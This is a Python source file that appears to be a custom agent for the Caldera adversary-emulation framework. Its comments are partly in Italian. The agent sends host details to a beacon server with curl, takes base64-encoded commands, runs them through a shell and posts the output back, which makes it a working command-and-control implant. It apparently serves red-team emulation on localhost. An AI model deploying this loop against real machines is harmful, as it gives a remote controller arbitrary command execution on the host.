import subprocess
import json
import base64
import argparse
import socket
import os
import platform
import time


class OperationLoop:

    def __init__(self, profile):
        self.profile = profile
        self.file_download_endpoint = "/file/download"
        self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint
        self.instruction_id = ''

    def start(self):
        self.profile['results'] = []
        print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
        while True:
            try:

                beacon = self._send_beacon()
                self.profile['results'].clear()
                instructions = self._next_instructions(beacon=beacon)
                sleep = self._handle_instructions(instructions)
                time.sleep(sleep)
            except Exception as e:
                print('[-] Operation loop error: %s' % e)
                time.sleep(30)

    def _send_beacon(self):
        profilejson = json.dumps(self.profile).encode('utf-8')
        profileb64 = base64.b64encode(profilejson).decode('utf-8')
        curl_cmd = f"curl -s -X POST -d {profileb64} localhost:8888/beacon"
        raw_result = subprocess.run(curl_cmd, shell=True,
                                    capture_output=True)  # shell=True may be a security concern. Watch out!

        result_dict = self.decodeshell_to_json(
            raw_result)  # from here we can retrieve all parameters given by caldera server

        # Retrieve all needeed parameters
        self.profile['paw'] = result_dict['paw']
        return result_dict

    def _next_instructions(self, beacon):
        # In the first step we'll execute the given instruction
        return json.loads(beacon['instructions'])

    # FORSE QUA BISOGNA CAMBIARE PERCHÈ IN RAGDOLL VA A SCORRERE TRA LE VARIE ISTRUZIONI, MA IO VEDO CHE NE MANDA SEMPRE UNA SOLA
    def _handle_instructions(self, instructions):
       
        if len(instructions) == 1:
            dec = instructions[0]
            command = json.loads(dec)['command']  # the command here is in base64
            self.instruction_id = json.loads(dec)['id']
        else:
            command = ''
        decoded_command = base64.b64decode(command)
        print(decoded_command)
        output = subprocess.run(decoded_command, shell=True, capture_output=True)
        print("Risultato shell:", output)
        response = self.build_response(output)
        # Send back the beacon response to Caldera server
        responsejson = json.dumps(response).encode('utf-8')
        beaconb64 = base64.b64encode(responsejson).decode('utf-8')
        print("VEDI QUA" + beaconb64)
        curl_cmd = f"curl -s -X POST -d {beaconb64} localhost:8888/beacon"
        beaconanswer = subprocess.run(curl_cmd, shell=True, capture_output=True)
        beaconanswer = self.decodeshell_to_json(beaconanswer)
        return beaconanswer['sleep']

    def build_response(self, output):
        
        return dict(
            paw=self.profile['paw'],
            results=[{
                'id': self.instruction_id,
                'output': base64.b64encode(output.stdout).decode('utf-8'),
                # IMPORTANT: Caldera expects to find the results base64 encoded. It is a must do it here, even if shortly after we're going to encode the entire payload of the http post.
                'status': output.returncode,
                'pid': os.getpid()
            }]
        )

    @staticmethod
    def decodeshell_to_json(s):
        b64result = s.stdout.decode('utf-8')

        result = base64.b64decode(b64result)

        result_dict = json.loads(result)
        return result_dict


def build_profile(server_addr):
    return dict(
        server=server_addr,
        host=socket.gethostname(),
        platform=platform.system().lower(),
        executors=['sh'],
        pid=os.getpid()
    )


# Typical "if" in python's script. It checks if the script was executed directly as a script (opposed as if it was a submodule)
if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False,
                        default='http://localhost:8888/beacon')  # Like Ragdoll Agent but different endpoint, if not specified (with -W, remember the /beacon!!) the default URL will be that one
    # In the original agent (private repo), here'll go another argument for the url of the remote agent
    args = parser.parse_args()
    try:
        p = build_profile('%s' % args.website)
        OperationLoop(profile=p).start()

    except Exception as e:
        print('[-] Web page may not be accessible, or: %s' % e)
